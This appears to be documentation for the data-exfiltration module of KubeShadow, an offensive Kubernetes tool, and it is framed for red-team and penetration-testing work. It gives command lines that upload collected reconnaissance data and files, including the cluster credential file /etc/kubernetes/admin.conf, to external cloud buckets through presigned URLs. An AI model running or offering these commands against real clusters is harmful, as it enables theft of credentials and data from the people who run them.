# Data Exfiltration Module

The `data-exfil` module provides capabilities to exfiltrate reconnaissance data and files to cloud storage services using presigned URLs.

## Overview

This module supports:
- **AWS S3** - Using presigned PUT URLs
- **Google Cloud Storage** - Using signed URLs  
- **Azure Blob Storage** - Using SAS URLs
- **Generic cloud storage** - Fallback methods for other providers

## Usage

### Basic Command Structure

```bash
kubeshadow data-exfil --presigned-url <URL> [options]
```

### Required Flags

- `--presigned-url`: The presigned/signed URL for uploading to cloud storage

### Optional Flags

- `--export-recon`: Export all reconnaissance data collected by KubeShadow
- `--file <path>`: Upload a specific file from the local filesystem
- `--format <format>`: Format for reconnaissance data export (json, yaml, csv)
- `--dashboard`: Enable dashboard publishing for real-time monitoring

## Examples

### 1. Export Reconnaissance Data to AWS S3

```bash
kubeshadow data-exfil \
  --presigned-url "https://mybucket.s3.amazonaws.com/path/to/file?X-Amz-Algorithm=..." \
  --export-recon \
  --format json
```

### 2. Upload Local File to Google Cloud Storage

```bash
kubeshadow data-exfil \
  --presigned-url "https://storage.googleapis.com/mybucket/path?X-Goog-Signature=..." \
  --file ./sensitive-data.txt
```

### 3. Upload to Azure Blob Storage with Dashboard

```bash
kubeshadow data-exfil \
  --presigned-url "https://myaccount.blob.core.windows.net/container/blob?sv=..." \
  --file ./config.yaml \
  --dashboard
```

### 4. Export Reconnaissance Data in Multiple Formats

```bash
# JSON format (default)
kubeshadow data-exfil --presigned-url <URL> --export-recon --format json

# YAML format
kubeshadow data-exfil --presigned-url <URL> --export-recon --format yaml

# CSV format (for spreadsheet analysis)
kubeshadow data-exfil --presigned-url <URL> --export-recon --format csv
```

## Cloud Provider Support

### AWS S3

The module automatically detects S3 URLs and uses:
- HTTP PUT requests
- Appropriate content-type headers
- Direct binary upload

**Example presigned URL format:**
```
https://bucket-name.s3.region.amazonaws.com/object-key?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=...
```

### Google Cloud Storage

Supports GCS signed URLs with:
- HTTP PUT requests
- Google-specific headers
- Binary content upload

**Example signed URL format:**
```
https://storage.googleapis.com/bucket-name/object-name?X-Goog-Signature=...
```

### Azure Blob Storage

Handles Azure SAS URLs using:
- HTTP PUT requests with BlockBlob type
- Azure-specific headers
- Proper content encoding

**Example SAS URL format:**
```
https://account.blob.core.windows.net/container/blob?sv=2020-08-04&ss=b&srt=sco&sp=rwdlacx&se=...
```

## Reconnaissance Data Collection

When using `--export-recon`, the module collects:

### System Information
- Hostname, OS, architecture
- CPU and memory details
- Kernel version and uptime
- User accounts and groups

### Network Information  
- Network interfaces and IP addresses
- DNS configuration
- Open ports and active connections
- Network routes

### Container Information
- Running containers
- Container images and status
- Mount points and volumes

### Process Information
- Running processes with PID, user, and command
- CPU and memory usage
- Process hierarchies

### Kubernetes Information (if available)
- Cluster name and version
- Namespace and pod information
- Service accounts and RBAC details
- Node information

### Cloud Metadata (if available)
- AWS EC2 instance metadata
- GCP Compute Engine metadata
- Azure VM metadata

### Environment Variables
- System environment (sensitive variables filtered)

## Output Formats

### JSON Format
```json
{
  "timestamp": "2025-10-02T18:30:00Z",
  "system": {
    "hostname": "target-system",
    "os": {
      "name": "Ubuntu",
      "version": "20.04"
    },
    "architecture": "x86_64"
  },
  "network": {
    "interfaces": [...],
    "openPorts": [...]
  },
  "processes": [...],
  "kubernetes": {...}
}
```

### YAML Format
```yaml
timestamp: "2025-10-02T18:30:00Z"
system:
  hostname: target-system
  os:
    name: Ubuntu
    version: "20.04"
  architecture: x86_64
network:
  interfaces: [...]
  openPorts: [...]
```

### CSV Format
```csv
Category,Key,Value,Timestamp
System,Hostname,target-system,2025-10-02T18:30:00Z
System,OS,Ubuntu 20.04,2025-10-02T18:30:00Z
Network,Open Ports,25 found,2025-10-02T18:30:00Z
```

## Security Considerations

### Data Filtering
- Sensitive environment variables are automatically filtered
- Credentials and API keys are excluded from exports
- Process command lines containing secrets are sanitized

### Transport Security
- All uploads use HTTPS
- Presigned URLs contain time-limited access tokens
- No credentials are stored or logged

### URL Masking
- Presigned URLs are masked in console output for security
- Only partial URL information is displayed

## Error Handling

The module includes robust error handling for:
- Invalid or expired presigned URLs
- Network connectivity issues
- Cloud provider authentication failures
- File permission problems
- Data collection failures

## Integration with Dashboard

When used with `--dashboard`, the module provides:
- Real-time upload progress
- Success/failure status updates
- File size and transfer statistics
- Error reporting and debugging info

## Troubleshooting

### Common Issues

1. **"presigned URL expired"**
   - Generate a new presigned URL with extended expiration
   - Check system clock synchronization

2. **"upload failed with status 403"**
   - Verify the presigned URL has upload permissions
   - Check bucket/container access policies

3. **"failed to collect recon data"**
   - Run KubeShadow with elevated privileges if needed
   - Check system compatibility for specific reconnaissance modules

4. **"file not found"**
   - Verify file path is correct and accessible
   - Check file permissions

### Debug Mode

Add `--verbose` flag for detailed logging:
```bash
kubeshadow data-exfil --presigned-url <URL> --export-recon --verbose
```

## Examples with Real Scenarios

### Red Team Exercise
```bash
# Collect all recon data and exfiltrate to team's S3 bucket
kubeshadow data-exfil \
  --presigned-url "https://redteam-bucket.s3.amazonaws.com/mission1/data.json?..." \
  --export-recon \
  --format json \
  --dashboard
```

### Penetration Testing  
```bash
# Upload specific configuration files discovered during testing
kubeshadow data-exfil \
  --presigned-url "https://storage.googleapis.com/pentest-data/client1/configs?..." \
  --file /etc/kubernetes/admin.conf
```

### Security Assessment
```bash
# Export reconnaissance data in CSV format for analysis
kubeshadow data-exfil \
  --presigned-url "https://assessment.blob.core.windows.net/data/recon.csv?..." \
  --export-recon \
  --format csv
```
